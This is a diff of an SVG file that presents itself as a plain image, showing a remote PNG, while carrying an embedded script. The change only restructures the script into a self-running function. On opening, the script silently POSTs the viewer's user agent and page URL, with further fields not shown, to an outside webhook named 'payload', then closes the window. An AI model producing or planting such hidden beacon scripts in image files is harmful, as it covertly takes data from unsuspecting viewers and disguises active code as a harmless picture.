@@ -1,12 +1,10 @@
 <svg xmlns="http://www.w3.org/2000/svg" width="400" height="400">
   <image href="https://files.catbox.moe/aie4kc.png" x="0" y="0" width="400" height="400" />
-  <script type="application/ecmascript">
-    <![CDATA[
+  <script type="application/ecmascript"><![CDATA[
+    (function() {
       fetch("https://payload-rust-theta.vercel.app/api/enviarWebhook", {
         method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
+        headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           userAgent: navigator.userAgent,
           url: location.href,
@@ -20,6 +18,6 @@
           window.close();
         }, 1000);
       });
-    ]]>
-  </script>
+    })();
+  ]]></script>
 </svg>
